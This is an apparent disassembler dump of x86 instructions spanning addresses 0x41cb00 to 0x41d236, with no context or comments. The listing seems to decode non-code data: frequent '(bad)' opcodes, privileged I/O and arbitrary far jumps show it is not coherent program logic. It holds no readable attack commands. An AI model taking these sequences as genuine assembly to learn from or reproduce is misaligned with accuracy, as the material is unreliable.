  41cb00:	ficomp DWORD PTR [edi-0x7e]
  41cb03:	sbb    BYTE PTR [ebp+0x4c4c0b50],0xe4
  41cb0a:	inc    eax
  41cb0b:	adc    DWORD PTR [ecx+edx*2],esi
  41cb0e:	or     BYTE PTR [eax+0x1737e88d],bl
  41cb14:	jnp    0x41cb38
  41cb16:	iret   
  41cb17:	fld    QWORD PTR [eax]
  41cb19:	jecxz  0x41cadc
  41cb1b:	je     0x41cb5a
  41cb1d:	arpl   WORD PTR [edx],bx
  41cb1f:	(bad)  
  41cb20:	jge    0x41cb99
  41cb22:	ins    BYTE PTR es:[edi],dx
  41cb23:	enter  0xf50,0x64
  41cb27:	push   0x5e
  41cb29:	inc    edx
  41cb2a:	fadd   DWORD PTR [eax-0x12]
  41cb2d:	(bad)  
  41cb2e:	mov    edi,0xa84e23f6
  41cb33:	mov    bh,0xaf
  41cb35:	out    dx,al
  41cb36:	cmp    DWORD PTR [edi+0x614a3af9],esi
  41cb3c:	xchg   ebp,eax
  41cb3d:	fstp   QWORD PTR [ecx]
  41cb3f:	in     eax,dx
  41cb40:	xchg   esp,eax
  41cb41:	scas   eax,DWORD PTR es:[edi]
  41cb42:	shl    DWORD PTR [esi-0x15d9fe5c],cl
  41cb48:	pop    ss
  41cb49:	xor    edi,esi
  41cb4b:	dec    edx
  41cb4c:	push   edi
  41cb4d:	iret   
  41cb4e:	fwait
  41cb4f:	dec    esp
  41cb50:	dec    ecx
  41cb51:	in     eax,dx
  41cb52:	pop    eax
  41cb53:	sub    eax,0x3e205f53
  41cb58:	dec    edx
  41cb59:	pop    eax
  41cb5a:	xor    edi,edi
  41cb5c:	fsubp  st(1),st
  41cb5e:	gs cdq 
  41cb60:	fsubr  DWORD PTR [edi+0x49]
  41cb63:	neg    DWORD PTR [eax+eax*4]
  41cb66:	jnp    0x41cbd3
  41cb68:	jmp    0x41cbc0
  41cb6a:	stos   BYTE PTR es:[edi],al
  41cb6b:	jne    0x41caed
  41cb6d:	mov    BYTE PTR [eax+0x88b5744],dl
  41cb73:	xchg   esp,eax
  41cb74:	push   ebp
  41cb75:	daa    
  41cb76:	mov    al,ds:0x71b1c51c
  41cb7b:	mov    dh,BYTE PTR ss:[esi-0x7d2cdd31]
  41cb82:	rcl    DWORD PTR [esp+ecx*2+0x2f],1
  41cb86:	jo     0x41cbe4
  41cb88:	dec    esi
  41cb89:	xchg   DWORD PTR [ebx+0x5d5a224c],ecx
  41cb8f:	mov    cs,WORD PTR [ecx-0x1ac39f3f]
  41cb95:	cmp    bl,dl
  41cb97:	sbb    BYTE PTR [edi+eiz*8+0x6d9673b8],cl
  41cb9e:	xchg   ebp,eax
  41cb9f:	add    bl,ch
  41cba1:	cmp    dl,BYTE PTR [esi+0x4a10b617]
  41cba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cba8:	retf   0xa4ee
  41cbab:	popa   
  41cbac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbad:	fwait
  41cbae:	jns    0x41cc2c
  41cbb0:	mov    al,ds:0xab69cd2c
  41cbb5:	call   0xea11:0x9a6dfc5
  41cbbc:	mov    al,ds:0xd4c77694
  41cbc1:	dec    ebx
  41cbc2:	(bad)  
  41cbc3:	push   esp
  41cbc4:	add    BYTE PTR [eax-0x63],bl
  41cbc7:	fnstenv [ecx-0x38]
  41cbca:	into   
  41cbcb:	lods   al,BYTE PTR ds:[esi]
  41cbcc:	cs mov ecx,0xb5a50fcc
  41cbd2:	and    ah,BYTE PTR [eax]
  41cbd4:	cs jg  0x41cbeb
  41cbd7:	sti    
  41cbd8:	pop    esi
  41cbd9:	iret   
  41cbda:	or     eax,0xdc2e7c21
  41cbdf:	(bad)  [eax]
  41cbe1:	(bad)  
  41cbe2:	sbb    eax,0x4eea153d
  41cbe7:	sar    DWORD PTR [eax],cl
  41cbe9:	loop   0x41cc3e
  41cbeb:	add    bh,ah
  41cbed:	repz add dl,dh
  41cbf0:	jp     0x41cc28
  41cbf2:	mov    dl,0x97
  41cbf4:	dec    ebx
  41cbf5:	xchg   ebx,eax
  41cbf6:	mov    WORD PTR [ecx],fs
  41cbf8:	in     al,dx
  41cbf9:	icebp  
  41cbfa:	(bad)  
  41cbfb:	fldcw  WORD PTR [edx+0x62]
  41cbfe:	sbb    DWORD PTR [edi],ecx
  41cc00:	jo     0x41cc2a
  41cc02:	lods   eax,DWORD PTR ds:[esi]
  41cc03:	imul   DWORD PTR [edx+0x8]
  41cc06:	or     eax,0x606ff237
  41cc0b:	nop
  41cc0c:	pop    esi
  41cc0d:	popf   
  41cc0e:	mov    ebx,0x6b54cea
  41cc13:	icebp  
  41cc14:	jo     0x41cbf3
  41cc16:	and    dl,ch
  41cc18:	mov    edx,0x7759b88a
  41cc1d:	gs inc ecx
  41cc1f:	aaa    
  41cc20:	jg     0x41cbb0
  41cc22:	rol    BYTE PTR [edi+0x0],0x0
	...
  41cc31:	cdq    
  41cc32:	ja     0x41cc23
  41cc34:	out    dx,al
  41cc35:	out    dx,eax
  41cc36:	(bad)  
  41cc37:	cdq    
  41cc38:	ja     0x41cbcf
  41cc3a:	daa    
  41cc3b:	xor    DWORD PTR ds:0x749add0c,ecx
  41cc41:	imul   ecx,DWORD PTR [eax+0x1],0x3ab00
  41cc48:	add    BYTE PTR ds:0x78b06a99,bh
  41cc4e:	xchg   edx,eax
  41cc4f:	sahf   
  41cc50:	sbb    edi,DWORD PTR [ecx-0x44b54a7c]
  41cc56:	and    BYTE PTR [eax],ah
  41cc58:	xor    ch,BYTE PTR [ebx+0x63]
  41cc5b:	adc    esi,DWORD PTR [edx+eax*1]
  41cc5e:	cdq    
  41cc5f:	ror    DWORD PTR [eax+0x2b],cl
  41cc62:	add    BYTE PTR [edi-0x25],dl
  41cc65:	or     DWORD PTR [ecx-0x21],edi
  41cc68:	mov    BYTE PTR [ecx+0x7e5f7db4],dl
  41cc6e:	cmc    
  41cc6f:	xchg   BYTE PTR [esi-0x4f],bh
  41cc72:	ret    
  41cc73:	sbb    bh,dl
  41cc75:	push   ebp
  41cc76:	jbe    0x41ccf7
  41cc78:	(bad)  
  41cc79:	cli    
  41cc7a:	and    DWORD PTR [ebx+0x27084691],edx
  41cc80:	out    dx,eax
  41cc81:	out    0xd,eax
  41cc83:	out    0xff,eax
  41cc85:	inc    eax
  41cc86:	rcl    DWORD PTR [eax],1
  41cc88:	imul   edi,DWORD PTR [ecx]
  41cc8b:	xchg   esp,eax
  41cc8c:	dec    ebx
  41cc8d:	sub    eax,0x6732292e
  41cc92:	nop
  41cc93:	pop    ecx
  41cc94:	nop
  41cc95:	cmp    DWORD PTR [ecx+0x685fa8b9],0x6e95b28b
  41cc9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cca0:	repz cmp eax,0xef60cd18
  41cca6:	stos   DWORD PTR es:[edi],eax
  41cca7:	in     eax,dx
  41cca8:	(bad)  
  41cca9:	outs   dx,DWORD PTR ds:[esi]
  41ccaa:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41ccac:	pop    es
  41ccad:	xor    esp,DWORD PTR [ebx]
  41ccaf:	push   esi
  41ccb0:	dec    edi
  41ccb1:	jb     0x41ccb5
  41ccb3:	jbe    0x41ccf2
  41ccb5:	fwait
  41ccb6:	call   0x162:0x3e1f7411
  41ccbd:	(bad)  [edi-0x5167e1b9]
  41ccc3:	das    
  41ccc4:	xor    ebx,DWORD PTR [ecx+0x72544121]
  41ccca:	jbe    0x41cd18
  41cccc:	arpl   WORD PTR [ebx],dx
  41ccce:	add    eax,0x33e9c649
  41ccd3:	(bad)  
  41ccd4:	fsincos 
  41ccd6:	sti    
  41ccd7:	psrlw  mm2,mm5
  41ccda:	or     eax,0x6be9b3bd
  41ccdf:	pop    ebx
  41cce0:	cld    
  41cce1:	inc    ecx
  41cce2:	jae    0x41cd1d
  41cce4:	sub    eax,0xa6e30342
  41cce9:	pop    edx
  41ccea:	pop    ss
  41cceb:	jp     0x41cd4c
  41cced:	mov    edx,0x3fb36805
  41ccf2:	jl     0x41cc96
  41ccf4:	aad    0xa9
  41ccf6:	aaa    
  41ccf7:	push   ds
  41ccf8:	sar    BYTE PTR [ebx-0x5a],1
  41ccfb:	into   
  41ccfc:	dec    edx
  41ccfd:	icebp  
  41ccfe:	dec    ebp
  41ccff:	cwde   
  41cd00:	(bad)  
  41cd01:	dec    eax
  41cd02:	stos   DWORD PTR es:[edi],eax
  41cd03:	jg     0x41cd06
  41cd05:	add    ebx,DWORD PTR ds:0x62707031
  41cd0b:	ficomp WORD PTR [edi]
  41cd0d:	stc    
  41cd0e:	add    BYTE PTR [ebx-0x4ee7cbeb],bh
  41cd14:	jae    0x41cd0a
  41cd16:	or     eax,0x5c2b9011
  41cd1b:	rcr    DWORD PTR [ebx+0x79],cl
  41cd1e:	sbb    edi,DWORD PTR [edx+0x7fe44dcc]
  41cd24:	push   eax
  41cd25:	addr16 out 0x68,eax
  41cd28:	aam    0x79
  41cd2a:	xor    al,0xb9
  41cd2c:	repz sbb ch,BYTE PTR [ecx]
  41cd2f:	retf   0x83
  41cd32:	out    0xf0,eax
  41cd34:	stos   DWORD PTR es:[edi],eax
  41cd35:	push   esp
  41cd36:	inc    esp
  41cd37:	addr16 aaa 
  41cd39:	dec    edx
  41cd3a:	mov    ebp,ebx
  41cd3c:	sbb    BYTE PTR [esi+ecx*8+0x3],dl
  41cd40:	sbb    BYTE PTR [edx+edi*1+0x21340278],dh
  41cd47:	jmp    0x41cd61
  41cd49:	popa   
  41cd4a:	int3   
  41cd4b:	xor    BYTE PTR [edx+esi*8],bh
  41cd4e:	push   ecx
  41cd4f:	popa   
  41cd50:	xor    ch,cl
  41cd52:	sahf   
  41cd53:	inc    edi
  41cd54:	mov    dh,0xa3
  41cd56:	and    eax,0x95c9e12f
  41cd5b:	retf   0x9c4d
  41cd5e:	pop    ds
  41cd5f:	inc    esi
  41cd60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd61:	lds    edx,FWORD PTR [ebx-0x20207125]
  41cd67:	mov    esi,0x505c580
  41cd6c:	sub    BYTE PTR [eax-0x75a6fc81],dh
  41cd72:	dec    edx
  41cd73:	fst    QWORD PTR [eax+eiz*4]
  41cd76:	cld    
  41cd77:	rcr    DWORD PTR [edi-0x1e],cl
  41cd7a:	cmc    
  41cd7b:	xchg   DWORD PTR [ebp-0x13b67e7b],ebx
  41cd81:	stc    
  41cd82:	lods   al,BYTE PTR ds:[esi]
  41cd83:	shl    BYTE PTR [ebp+0x37cecf2],cl
  41cd89:	sbb    esp,DWORD PTR [eax+0x36]
  41cd8c:	dec    eax
  41cd8d:	pop    esp
  41cd8e:	inc    ecx
  41cd8f:	mov    edi,0x39a67018
  41cd94:	adc    ebp,DWORD PTR [ecx+0x50]
  41cd97:	fwait
  41cd98:	lahf   
  41cd99:	dec    ecx
  41cd9a:	fwait
  41cd9b:	mov    ch,0x84
  41cd9d:	adc    ecx,edi
  41cd9f:	cmp    DWORD PTR [esi],edi
  41cda1:	enter  0x493f,0x11
  41cda5:	push   0xffffff8b
  41cda7:	in     al,dx
  41cda8:	loop   0x41cdfe
  41cdaa:	mov    ebx,0xa17f2ff0
  41cdaf:	jmp    0x573905a6
  41cdb4:	push   es
  41cdb5:	fbld   TBYTE PTR [edi-0xc]
  41cdb8:	jmp    0x41cd77
  41cdba:	loopne 0x41ce08
  41cdbc:	cmp    esi,esi
  41cdbe:	and    eax,0xe3788d86
  41cdc3:	fiadd  WORD PTR [eax+eiz*4+0xf]
  41cdc7:	outs   dx,BYTE PTR ds:[esi]
  41cdc8:	dec    eax
  41cdc9:	popa   
  41cdca:	hlt    
  41cdcb:	add    edi,edi
  41cdcd:	and    edx,DWORD PTR [edx]
  41cdcf:	out    0xc0,al
  41cdd1:	xchg   DWORD PTR [ecx-0xf7a8615],ebx
  41cdd7:	mov    ecx,0xed354c9e
  41cddc:	xchg   ecx,eax
  41cddd:	jmp    0xc4b6:0x119c649d
  41cde4:	sub    DWORD PTR [ebx-0x2f],edx
  41cde7:	jne    0x41ce18
  41cde9:	dec    ebx
  41cdea:	xchg   esp,eax
  41cdeb:	pop    ebp
  41cdec:	xchg   ebp,eax
  41cded:	mov    ebx,0xd8d547c0
  41cdf2:	test   DWORD PTR [ebp+0x622b2e63],eax
  41cdf8:	cmp    al,0x44
  41cdfa:	out    0x92,eax
  41cdfc:	(bad)  
  41cdfd:	fist   DWORD PTR [ecx+0x780cd886]
  41ce03:	push   0x19b46161
  41ce08:	mov    dl,0xff
  41ce0a:	pop    esp
  41ce0b:	mov    es,edi
  41ce0d:	retf   
  41ce0e:	lds    ecx,FWORD PTR ds:0xcdae2de8
  41ce14:	or     BYTE PTR [esi-0x71],0x9c
  41ce18:	jmp    0x3d1c1f0
  41ce1d:	mov    eax,0x21ecd3da
  41ce22:	dec    esi
  41ce23:	push   eax
  41ce24:	ret    0x130d
  41ce27:	dec    esi
  41ce28:	fidiv  DWORD PTR [edi+0x46]
  41ce2b:	xor    BYTE PTR [ebx+0x48],0x5
  41ce2f:	xchg   edx,eax
  41ce30:	mov    dl,0x83
  41ce32:	adc    BYTE PTR [eax],al
  41ce34:	mov    WORD PTR [edi],ds
  41ce36:	sbb    bl,BYTE PTR [eax+0x5b]
  41ce39:	mov    cl,ah
  41ce3b:	cmp    BYTE PTR [eax+edi*2],bh
  41ce3e:	jp     0x41ce3b
  41ce40:	ret    
  41ce41:	mov    bh,0xea
  41ce43:	retf   
  41ce44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce45:	inc    esp
  41ce46:	popa   
  41ce47:	es jno 0x41ce16
  41ce4a:	adc    DWORD PTR [eax-0x304cefbc],eax
  41ce50:	mov    esp,0x3033d07a
  41ce55:	or     DWORD PTR [ecx],eax
  41ce57:	mov    gs,WORD PTR [edi-0x6a]
  41ce5a:	jno    0x41ce8d
  41ce5c:	add    dh,BYTE PTR [esi]
  41ce5e:	add    DWORD PTR [edi],eax
  41ce60:	scas   al,BYTE PTR es:[edi]
  41ce61:	and    ebx,DWORD PTR [edi+eiz*4+0x5d3ba784]
  41ce68:	pop    eax
  41ce69:	inc    edx
  41ce6a:	xlat   BYTE PTR ds:[ebx]
  41ce6b:	in     eax,0xaa
  41ce6d:	neg    BYTE PTR [esi]
  41ce6f:	shl    BYTE PTR [esi],1
  41ce71:	jne    0x41ce04
  41ce73:	push   edx
  41ce74:	push   cs
  41ce75:	(bad)  
  41ce76:	aam    0x2
  41ce78:	pop    ebx
  41ce79:	adc    al,BYTE PTR [esp+0x70]
  41ce7d:	(bad)  
  41ce7e:	jns    0x41ce97
  41ce80:	sub    al,0xa9
  41ce82:	adc    DWORD PTR [esi-0x2],ebx
  41ce85:	(bad)  
  41ce86:	mov    eax,ds:0x4cc51635
  41ce8b:	ret    
  41ce8c:	loopne 0x41ce35
  41ce8e:	mov    al,ds:0xbbcdc3ef
  41ce93:	or     DWORD PTR [ecx+0x25caf44f],esi
  41ce99:	or     cl,BYTE PTR [eax]
  41ce9b:	mov    DWORD PTR [ecx+0x51e8bb58],0xd45b5262
  41cea5:	inc    ebp
  41cea6:	loope  0x41ce7e
  41cea8:	cwde   
  41cea9:	or     ecx,DWORD PTR [edi]
  41ceab:	cmc    
  41ceac:	cmp    ch,BYTE PTR [ecx-0x69]
  41ceaf:	inc    esi
  41ceb0:	xor    bl,dh
  41ceb2:	loopne 0x41ce69
  41ceb4:	sbb    eax,0xcca1dd1f
  41ceb9:	loopne 0x41ce4b
  41cebb:	aam    0x99
  41cebd:	jl     0x41ced9
  41cebf:	push   0xffffffeb
  41cec1:	add    cl,dh
  41cec3:	dec    edx
  41cec4:	fcomp  QWORD PTR [eax]
  41cec6:	jg     0x41ceef
  41cec8:	inc    ebp
  41cec9:	adc    bh,BYTE PTR [ebp-0xd]
  41cecc:	(bad)  
  41cecd:	sbb    dh,BYTE PTR [ecx]
  41cecf:	jl     0x41ced0
  41ced1:	xor    al,0xa2
  41ced3:	push   esp
  41ced4:	xor    edx,eax
  41ced6:	cwde   
  41ced7:	fadd   DWORD PTR [edx+0x43cdfb9f]
  41cedd:	mov    dh,0x5c
  41cedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cee0:	out    0xb7,eax
  41cee2:	out    0x8d,al
  41cee4:	sub    eax,DWORD PTR [edx]
  41cee6:	adc    al,0x8c
  41cee8:	jl     0x41cf2c
  41ceea:	jb     0x41ce86
  41ceec:	jle    0x41cea5
  41ceee:	mov    edx,0x2510e222
  41cef3:	test   BYTE PTR [eax+0x1b],dl
  41cef6:	mov    edi,0x8f16431
  41cefb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cefc:	jge    0x41cf1b
  41cefe:	fisubr WORD PTR [ecx]
  41cf00:	xchg   DWORD PTR [edi+0x564e118d],ecx
  41cf06:	add    ecx,DWORD PTR [esi]
  41cf08:	mov    edi,0x495c61c7
  41cf0d:	fild   DWORD PTR ds:0xf855631c
  41cf13:	push   ss
  41cf14:	push   ss
  41cf15:	adc    ah,BYTE PTR [esi-0x345bbff7]
  41cf1b:	out    0x25,eax
  41cf1d:	xchg   ecx,eax
  41cf1e:	arpl   WORD PTR [eax],si
  41cf20:	aas    
  41cf21:	push   cs
  41cf22:	mov    BYTE PTR [ebx],al
  41cf24:	inc    eax
  41cf25:	jl     0x41cfa5
  41cf27:	or     DWORD PTR [ebx],edx
  41cf29:	std    
  41cf2a:	enter  0xd962,0xd9
  41cf2e:	inc    edi
  41cf2f:	mov    edx,0x264217e5
  41cf34:	mov    dh,0xb1
  41cf36:	clc    
  41cf37:	mov    eax,ds:0x1970b99
  41cf3c:	and    DWORD PTR [eax],eax
  41cf3e:	mov    edx,0xf491c07
  41cf43:	retf   0xaac2
  41cf46:	mov    ah,0x91
  41cf48:	xchg   BYTE PTR [eax+ecx*2-0x2e11c50d],bh
  41cf4f:	jns    0x41cf91
  41cf51:	xor    edx,DWORD PTR [ebp-0x2]
  41cf54:	adc    eax,0x3f5eebb0
  41cf59:	fimul  DWORD PTR ds:0xfeb6e204
  41cf5f:	push   0xff4d765f
  41cf64:	aaa    
  41cf65:	out    dx,al
  41cf66:	inc    esp
  41cf67:	(bad)  
  41cf68:	div    DWORD PTR [edi+0x7]
  41cf6b:	ret    
  41cf6c:	jbe    0x41cf98
  41cf6e:	xor    BYTE PTR fs:[eax-0x5dd8d9f7],dh
  41cf75:	mov    gs:0xe11ae457,eax
  41cf7b:	push   cs
  41cf7c:	out    0x39,eax
  41cf7e:	jle    0x41cfd0
  41cf80:	or     edx,DWORD PTR [eax]
  41cf82:	mov    BYTE PTR [edx-0x5a],al
  41cf85:	gs and dh,ch
  41cf88:	aam    0xc5
  41cf8a:	mov    cl,BYTE PTR [eax+0x3f9ad8ce]
  41cf90:	fcomp  DWORD PTR [esi-0x9]
  41cf93:	cs fcmovnb st,st(4)
  41cf96:	and    eax,0x1f267f30
  41cf9b:	mov    ah,0xf7
  41cf9d:	push   esi
  41cf9e:	pop    ecx
  41cf9f:	sub    edi,DWORD PTR [edi+eiz*2]
  41cfa2:	push   0x6f622cf2
  41cfa7:	cmp    BYTE PTR ds:[ebp-0x36b5fc98],dl
  41cfae:	mov    al,ds:0x1038445a
  41cfb3:	cmp    ebx,DWORD PTR [edi-0xde98b11]
  41cfb9:	in     eax,dx
  41cfba:	loopne 0x41cfcf
  41cfbc:	(bad)  
  41cfbd:	(bad)  
  41cfbe:	xor    esi,esp
  41cfc0:	jl     0x41cf56
  41cfc2:	mov    ebp,0x5b20c6d2
  41cfc7:	add    ebx,DWORD PTR [ecx+0x65]
  41cfca:	jg     0x41cf69
  41cfcc:	mov    eax,0x60f97c78
  41cfd1:	jns    0x41cfe6
  41cfd3:	and    BYTE PTR [edx+eax*8+0x66e1704f],dl
  41cfda:	jnp    0x41d048
  41cfdc:	data16 adc BYTE PTR gs:0x48915734,bl
  41cfe4:	inc    esi
  41cfe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfe6:	push   0xcba1f854
  41cfeb:	mov    ah,0x88
  41cfed:	ss int3 
  41cfef:	out    dx,al
  41cff0:	mov    ebx,0xdadef6
	...
  41d001:	xchg   edx,eax
  41d002:	inc    esp
  41d003:	mov    al,BYTE PTR [edi+0x559fcfde]
  41d009:	loop   0x41cf9a
  41d00b:	aad    0x3
  41d00d:	push   esp
  41d00e:	loopne 0x41d07c
  41d010:	stos   DWORD PTR es:[edi],eax
  41d011:	adc    al,0x4c
  41d013:	add    DWORD PTR [eax],eax
  41d015:	stos   DWORD PTR es:[edi],eax
  41d016:	add    eax,DWORD PTR [eax]
  41d018:	add    BYTE PTR [ebx+eiz*4-0x2a6c3f34],ch
  41d01f:	inc    esi
  41d020:	xor    DWORD PTR [ecx-0x22],ebx
  41d023:	add    eax,0xcc755ea
  41d028:	out    0xd0,eax
  41d02a:	les    ebx,FWORD PTR [edx]
  41d02c:	or     DWORD PTR [ecx+edx*1-0x622ca8d7],esi
  41d033:	rol    bh,0x3a
  41d036:	pusha  
  41d037:	jge    0x41d0b8
  41d039:	jmp    0xd7f2b86a
  41d03e:	popf   
  41d03f:	lock xor al,0x4e
  41d042:	je     0x41d0a8
  41d044:	pop    ebx
  41d045:	mov    bl,0x58
  41d047:	hlt    
  41d048:	add    ebp,DWORD PTR [edx-0x5f2398f8]
  41d04e:	shl    DWORD PTR [edx+0x61],cl
  41d051:	ss mov ah,dl
  41d054:	and    eax,DWORD PTR [edi-0x2371c621]
  41d05a:	shl    BYTE PTR [ebp+0x2c22e804],cl
  41d060:	in     eax,0x9c
  41d062:	add    al,BYTE PTR [esi]
  41d064:	mov    ?,WORD PTR [eax-0x25]
  41d067:	(bad)  [esi]
  41d069:	jl     0x41d07e
  41d06b:	mov    BYTE PTR [esi-0x2e4246e7],dh
  41d071:	in     eax,0x12
  41d073:	aaa    
  41d074:	sbb    esi,DWORD PTR [eax-0x7d8632a0]
  41d07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d07b:	call   0xf4bd454c
  41d080:	fcmovne st,st(6)
  41d082:	lds    esp,FWORD PTR [ecx-0x2a]
  41d085:	xchg   edi,eax
  41d086:	mov    gs,eax
  41d088:	mov    al,0xd9
  41d08a:	popw   ds
  41d08c:	push   cs
  41d08d:	pop    ecx
  41d08e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d08f:	(bad)  
  41d090:	div    DWORD PTR [ebp+ebx*2-0x47b7b7c5]
  41d097:	dec    edi
  41d098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d099:	add    BYTE PTR [eax+0x2d],cl
  41d09c:	cmp    BYTE PTR [ebp+0x46288b9c],0xe4
  41d0a3:	(bad)  
  41d0a4:	mov    esi,DWORD PTR [ebp-0x7eb000b8]
  41d0aa:	ss cld 
  41d0ac:	dec    eax
  41d0ad:	inc    ebp
  41d0ae:	sahf   
  41d0af:	pop    ss
  41d0b0:	sub    al,0x7b
  41d0b2:	or     esi,esp
  41d0b4:	jl     0x41d081
  41d0b6:	xchg   ebx,eax
  41d0b7:	in     al,0x4a
  41d0b9:	adc    al,0xc1
  41d0bb:	jo     0x41d135
  41d0bd:	mov    dl,0x1f
  41d0bf:	retf   
  41d0c0:	cmp    bh,BYTE PTR [ebx+eiz*2+0x55]
  41d0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0c5:	fwait
  41d0c6:	js     0x41d118
  41d0c8:	mov    ch,0xd6
  41d0ca:	cmp    BYTE PTR [ebx+0x3f1b3e62],ah
  41d0d0:	add    al,0x41
  41d0d2:	mov    eax,0x421f701d
  41d0d7:	mov    cl,0x26
  41d0d9:	pop    edi
  41d0da:	retf   
  41d0db:	mov    edx,0xcce53bd6
  41d0e0:	mov    ch,0x8e
  41d0e2:	loopne 0x41d0ff
  41d0e4:	addr16 sbb al,0xe
  41d0e7:	das    
  41d0e8:	ins    BYTE PTR es:[edi],dx
  41d0e9:	mov    esi,0xb618d11e
  41d0ee:	inc    ecx
  41d0ef:	pop    ecx
  41d0f0:	or     BYTE PTR [edx],ch
  41d0f2:	in     eax,0xc3
  41d0f4:	aad    0x7
  41d0f6:	push   edx
  41d0f7:	lock and ah,BYTE PTR [ecx]
  41d0fa:	lds    ebx,FWORD PTR [edx-0x61]
  41d0fd:	jge    0x41d0b9
  41d0ff:	aam    0xc7
  41d101:	cmc    
  41d102:	cli    
  41d103:	jmp    0x3d07d7b3
  41d108:	sbb    al,0x17
  41d10a:	cli    
  41d10b:	repnz aas 
  41d10d:	js     0x41d185
  41d10f:	shl    BYTE PTR [eax+0x31],1
  41d112:	jle    0x41d0ed
  41d114:	daa    
  41d115:	jae    0x41d13b
  41d117:	add    ch,BYTE PTR ds:0x45a93479
  41d11d:	xchg   ebx,eax
  41d11e:	mov    edx,ss
  41d120:	dec    eax
  41d121:	cwd    
  41d123:	pop    esi
  41d124:	ret    0x1dbd
  41d127:	fcmovbe st,st(5)
  41d129:	xchg   esi,edi
  41d12b:	cmp    dl,al
  41d12d:	fnstsw ax
  41d12f:	add    BYTE PTR [ebp+esi*4+0x56],0x46
  41d134:	jae    0x41d122
  41d136:	int    0x1f
  41d138:	dec    ebp
  41d139:	pop    ecx
  41d13a:	adc    eax,edi
  41d13c:	push   edx
  41d13d:	cmp    dh,BYTE PTR [esi+0x65c44d4b]
  41d143:	neg    al
  41d145:	fs push eax
  41d147:	dec    esi
  41d148:	js     0x41d18b
  41d14a:	pop    ebx
  41d14b:	ret    0x39d
  41d14e:	stos   BYTE PTR es:[edi],al
  41d14f:	call   FWORD PTR [ebx]
  41d151:	push   esp
  41d152:	cmp    dl,BYTE PTR [ecx+0x2308de8d]
  41d158:	aad    0x9a
  41d15a:	sbb    DWORD PTR ds:0x667b4b1b,eax
  41d160:	test   eax,0xfd26c3c2
  41d165:	pop    edi
  41d166:	ins    DWORD PTR es:[edi],dx
  41d167:	push   edx
  41d168:	bound  ebx,QWORD PTR [ebp-0x78c86b82]
  41d16e:	sub    BYTE PTR ds:0xd6849979,0x62
  41d175:	cmp    al,0x3b
  41d177:	ins    DWORD PTR es:[edi],dx
  41d178:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41d17a:	maxps  xmm2,xmm6
  41d17d:	outs   dx,DWORD PTR ds:[esi]
  41d17e:	and    esi,DWORD PTR [esi-0x5a21e4d7]
  41d184:	pop    eax
  41d185:	xchg   esi,eax
  41d186:	xor    BYTE PTR [edi],cl
  41d188:	jb     0x41d1d8
  41d18a:	leave  
  41d18b:	push   ecx
  41d18c:	clc    
  41d18d:	pop    edi
  41d18e:	in     al,0x5
  41d190:	icebp  
  41d191:	or     eax,0x72f8b90c
  41d196:	dec    esi
  41d197:	jl     0x41d1b1
  41d199:	pop    ebx
  41d19a:	jno    0x41d1bf
  41d19c:	xchg   ebp,eax
  41d19d:	jbe    0x41d1c8
  41d19f:	out    dx,al
  41d1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1a1:	ret    
  41d1a2:	inc    edi
  41d1a3:	sub    BYTE PTR [esi],dl
  41d1a5:	pushf  
  41d1a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1a7:	mov    dl,0x29
  41d1a9:	or     bl,BYTE PTR [ecx]
  41d1ab:	and    BYTE PTR [edx],0x42
  41d1ae:	cmp    ch,ch
  41d1b0:	repz mov ebx,0x2195eaa3
  41d1b6:	imul   DWORD PTR [eax-0x42]
  41d1b9:	push   eax
  41d1ba:	pop    esi
  41d1bb:	jb     0x41d22b
  41d1bd:	pop    ebp
  41d1be:	push   eax
  41d1bf:	push   esp
  41d1c0:	push   ebp
  41d1c1:	jbe    0x41d23b
  41d1c3:	mov    BYTE PTR [ecx+ecx*1],dl
  41d1c6:	xor    esi,ecx
  41d1c8:	scas   al,BYTE PTR es:[edi]
  41d1c9:	test   DWORD PTR [edi+0x2e07c546],ebp
  41d1cf:	jge    0x41d1ed
  41d1d1:	push   ebx
  41d1d2:	or     edi,DWORD PTR [ebx]
  41d1d4:	adc    esp,DWORD PTR [ebx-0x41]
  41d1d7:	sbb    ebp,ebp
  41d1d9:	push   cs
  41d1da:	loop   0x41d213
  41d1dc:	sub    BYTE PTR [edx-0x77],ah
  41d1df:	pop    eax
  41d1e0:	in     al,dx
  41d1e1:	aam    0xeb
  41d1e3:	shl    DWORD PTR [ecx+0x5c8b2dd2],cl
  41d1e9:	cmp    DWORD PTR [ebx-0x29],ebx
  41d1ec:	mov    esi,0x607a66f0
  41d1f1:	enter  0x16a7,0x94
  41d1f5:	inc    edi
  41d1f6:	pop    esp
  41d1f7:	or     eax,edi
  41d1f9:	or     al,0xbf
  41d1fb:	in     al,dx
  41d1fc:	cmp    bh,al
  41d1fe:	fcom   DWORD PTR [ebx-0x34]
  41d201:	xchg   BYTE PTR [edi-0x6a],bl
  41d204:	out    0x87,eax
  41d206:	dec    ebx
  41d207:	mov    esi,0x13816c4a
  41d20c:	add    BYTE PTR [ecx+0x40],cl
  41d20f:	(bad)  
  41d210:	jns    0x41d255
  41d212:	dec    esi
  41d213:	iret   
  41d214:	pop    ss
  41d215:	pop    ss
  41d216:	fidivr WORD PTR [edx+ecx*4+0x19]
  41d21a:	test   DWORD PTR [ebx],ecx
  41d21c:	mov    esi,0x4f7f16
  41d221:	jp     0x41d1b9
  41d223:	call   0xf53c:0xea6b96f9
  41d22a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d22b:	xor    eax,0xb1b79c83
  41d230:	gs dec esp
  41d232:	enter  0x807,0xb7
  41d236:	stos   DWORD PTR es:[edi],eax
